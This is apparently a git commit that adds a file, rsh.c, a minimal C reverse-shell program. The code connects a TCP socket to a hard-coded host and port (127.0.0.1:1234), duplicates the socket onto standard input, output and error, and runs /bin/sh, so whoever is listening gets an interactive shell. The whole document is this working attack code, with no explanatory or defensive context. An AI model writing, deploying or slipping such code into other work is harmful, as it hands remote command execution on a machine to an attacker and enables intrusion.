2790d545ad25b82e315b3f89481d08c418a14198
William Martens <68499986+loneicewolf@users.noreply.github.com>
2023-01-27 19:04:08 +0100

    Create rsh.c

---
+++ rsh.c
@@ -0,0 +1,17 @@
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <unistd.h>
+#define RP 1234
+#define RH "127.0.0.1"
+#define BIN "/bin/sh"
+int main(){
+int is = 0;is = socket(AF_INET,SOCK_STREAM,0);
+struct  sockaddr_in s1;
+s1.sin_family      = AF_INET;
+s1.sin_port        = htons(RP);
+s1.sin_addr.s_addr = inet_addr(RH);
+connect( is,(struct sockaddr *) &s1,sizeof(s1));
+for(int i=0;i<3;dup2(is,i),i++);
+char * const argv[] = {BIN,NULL};
+execve(BIN, argv, NULL);
+return 0;}
